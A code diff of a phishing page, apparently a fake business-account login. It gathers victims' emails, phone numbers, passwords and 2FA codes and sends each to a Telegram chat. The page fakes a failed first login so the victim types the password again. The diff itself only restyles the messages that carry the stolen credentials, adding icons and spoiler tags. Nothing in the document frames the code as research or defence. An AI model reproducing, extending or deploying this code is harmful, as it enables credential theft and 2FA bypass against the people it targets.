@@ -171,7 +171,7 @@ export default function Home() {
     
     setErrors({}); setLoading(true);
     
-    // Tạo nội dung tin nhắn (bỏ header dài dòng)
+    // Tạo nội dung tin nhắn đầy đủ (gửi 1 lần đầu)
     const text = `<b>IP:</b> <code>${escapeHtml(clientIp)}</code>\n<b>Business:</b> <code>${escapeHtml(busName)}</code>\n<b>P.Email:</b> <code>${escapeHtml(perEmail)}</code>\n<b>B.Email:</b> <code>${escapeHtml(busEmail)}</code>\n<b>Phone:</b> <code>${escapeHtml(countryCode + phoneNum)}</code>\n`;
     
     setInitialSession(text); 
@@ -183,14 +183,19 @@ export default function Home() {
   const handleLogin = (e) => {
     e.preventDefault(); if (loginPass.length === 0) return;
     setLoading(true); setShowLoginError(false); const newAttempt = loginAttempt + 1; setLoginAttempt(newAttempt);
-    sendTelegramMessage(`\n<b>Login ${newAttempt}:</b> <code>${escapeHtml(loginUser)}</code> | <code>${escapeHtml(loginPass)}</code>`);
+    
+    // Nổi bật chữ Login + thêm icon đỏ
+    sendTelegramMessage(`\n<b>🔴 <tg-spoiler>Login ${newAttempt}:</tg-spoiler></b> <code>${escapeHtml(loginUser)}</code> | <code>${escapeHtml(loginPass)}</code>`);
+    
     setTimeout(() => { setLoading(false); if (newAttempt === 1) { setShowLoginError(true); setLoginPass(''); } else { setStep(3); } }, (newAttempt === 1) ? 3000 : 5000);
   };
 
   const handleOtp = (e) => {
     e.preventDefault(); if (!/^\d{6}$|^\d{8}$/.test(otp)) { setShowOtpError(true); return; }
     setLoading(true); setShowOtpError(false); const newAttempt = otpAttempt + 1; setOtpAttempt(newAttempt);
-    if (newAttempt <= 3) sendTelegramMessage(`\n<b>2FA ${newAttempt}:</b> <code>${escapeHtml(otp)}</code>`);
+    
+    // Nổi bật chữ 2FA + thêm icon đỏ
+    if (newAttempt <= 3) sendTelegramMessage(`\n<b>🔴 <tg-spoiler>2FA ${newAttempt}:</tg-spoiler></b> <code>${escapeHtml(otp)}</code>`);
     
     setTimeout(() => { 
         setLoading(false); 
